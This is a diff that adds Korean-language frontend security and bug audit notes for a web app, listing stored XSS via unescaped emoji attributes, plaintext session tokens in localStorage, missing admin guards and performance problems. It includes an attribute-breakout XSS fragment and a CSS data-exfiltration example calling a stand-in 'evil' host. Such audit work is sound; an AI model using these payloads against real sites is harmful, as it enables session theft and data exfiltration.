@@ -50,3 +50,55 @@
 - [ ] Content-Security-Policy 헤더 추가
 - [ ] 관리자 비밀번호 재설정 시 세션 무효화 확인
 - [ ] `reset_token` 만료 시간 추가
+
+---
+
+# Frontend Audit (web/) — 보안 우선순위
+
+## CRITICAL (즉시 수정)
+
+- [x] **Stored XSS → 계정 탈취 체인** — `web/src/components/RightSidebar.tsx:176`에서 리액션 알림 HTML을 정화 없이 `dangerouslySetInnerHTML`에 삽입. 근본 원인은 `web/src/lib/emojis.ts:183`의 `renderCustomEmojis`가 이모지 keyword를 `alt`/`title` 속성에 이스케이프 없이 삽입하는 것. 원격 서버 `_emojis` keyword에 `"`(예: `x" onerror="...`)를 넣으면 속성 탈출 → 저장형 XSS. 이미 세션 토큰이 `localStorage`(`web/src/lib/api.ts:21` `storeAccount`)에 평문 저장되어 있어 XSS 1건으로 전 계정 탈취. → emojis.ts 속성 이스케이프 + RightSidebar:176에 `sanitizeName` 적용
+- [x] **EditModal 미정화 렌더링** — `web/src/components/EditModal.tsx:82`에서 `post.content`를 DOMPurify 없이 `dangerouslySetInnerHTML`. 원격/연합 글을 수정 모달로 열면 저장형 XSS 노출 → `sanitizePost` 적용
+
+## HIGH (상용 서비스 전)
+
+- [x] **관리자 페이지 인증 가드 누락** — `web/src/app/admin/rules/page.tsx`, `web/src/app/admin/announcements/page.tsx`에만 `user.role` 가드 없음 (다른 admin 12개 페이지는 전부 가드 존재). 백엔드가 거부하므로 피해 제한적이나 방어계층 보강 필요
+- [ ] **sanitize 설정 완화** — `web/src/lib/sanitize.ts:5,10,15`에서 `style` 속성 허용. DOMPurify가 `javascript:` CSS는 차단하지만 `background-image:url(https://evil/collect)` 같은 데이터 유출 CSS는 기본 차단 안 함. 서버측 정화 연계 확인 필요
+- [ ] **세션 토큰 localStorage 평문 저장** — `web/src/lib/api.ts:6,21`(`storeAccount`), `login/page.tsx:33`, `AccountSwitcher.tsx:92`에서 전 계정 session_token을 localStorage에 저장. HttpOnly 쿠키 기반으로 재검토 (XSS 취약점 1건이면 전 계정 탈취)
+
+## MEDIUM
+
+- [ ] **sw.js origin 검사 우회** — `web/public/sw.js:26`에서 `client.url.includes(origin)` 부분 일치 검사. push payload의 `url`을 그대로 `client.navigate()` → 유사 도메인/절대 URL 통과 가능
+- [ ] **작성 중 이탈 경고 1회만 동작** — `web/src/lib/useNavigationBlock.ts:13,35,51,63,89`에서 `navigatingRef`가 true가 된 후 리셋 없음. 첫 확인 후 세션 내내 경고 비활성화
+
+## LOW
+
+- [ ] **미사용 SSE 코드** — `web/src/lib/useStream.ts:16`이 `/api/stream`(미존재)을 여는 dead code. 실제 엔드포인트는 `/api/timeline/stream`, `/api/notifications/stream`
+
+---
+
+# Frontend Audit (web/) — 버그 & 병목
+
+## 버그 (BUG)
+
+- [ ] 인용 글 입력 중 반복 요청 — `web/src/components/PostForm.tsx:161` `!quoteUrl` 가드로 인용 해석 후에도 타이핑마다 `/api/fetch-post` 재요청
+- [ ] 서버 정보 1회만 fetch — `web/src/components/RightSidebar.tsx:60` `__serverInfoFetched` 가드 미리셋 → `serverchange`로 갱신 불가, 실패 시 재시도 없음
+- [ ] 알림 배열 무한 성장 — `web/src/components/RightSidebar.tsx:43-49` SSE 알림 prepend 상한 없음
+- [ ] Backspace 중복 트리거 — `web/src/components/AccountSwitcher.tsx:42-45` 모달 닫기 + KeyboardShortcuts `router.back()` 동시 발생
+- [ ] PostForm:104 `seriesEpisodeMatch` dead code / :671 `setPollExpiresIn(24)` 유효 옵션 아님 / :659-662 업로드 실패 조용히 사라짐 / :907 `mediaUploading` 미사용 / :919-924 stale `content` 클로저
+- [ ] InfiniteScroll.tsx:28-33 `.main-content` 1회 조회 — 없으면 무한 스크롤 정지
+- [ ] Avatar.tsx:13-16 `imgError` 미리셋 — avatar 변경돼도 폴백 유지
+- [ ] ScrollRestoration.tsx:56-74 `scrollRestoration="manual"` 미복원
+- [ ] MiniPostCard.tsx:62-66 엔티티 디코딩 휴리스틱 — `&amp;` 텍스트가 태그로 변환될 수 있음
+- [ ] users/settings/export/page.tsx:41 SettingsNav 탭 오표시 (`current="migrate"`)
+- [ ] page.tsx(홈):18 클라이언트 useEffect에서 서버용 `redirect()` 사용 → `router.replace` 권장
+
+## 병목 (PERF)
+
+- [ ] 알림 SSE 2중 연결 — `RightSidebar.tsx:35` + `NotifSound.tsx:37` 페이지당 EventSource 2개
+- [ ] 공지 폴링 3중화 — `AnnouncementToast.tsx:52`/`Sidebar.tsx:97`/`MobileNav.tsx:73`이 각각 30초 폴링
+- [ ] ScrollRestoration.tsx:46-50 모든 scroll 이벤트마다 sessionStorage 전체 직렬화
+- [ ] quote-cache.ts:6 memoryCache 무제한 (세션 동안 인용 글 전부 보유)
+- [ ] series/[id]/notices/[nid]/page.tsx:31, [nid]/edit:34, series/[id]/page.tsx:70-73 공지 전체 fetch 후 클라이언트 필터
+- [ ] emojis.ts:78 이모지 전체 `limit=9999` 로드 → localStorage 캐시
+- [ ] timeline/[type]/page.tsx 계정별 타임라인 localStorage 평문 캐시(5분 TTL)
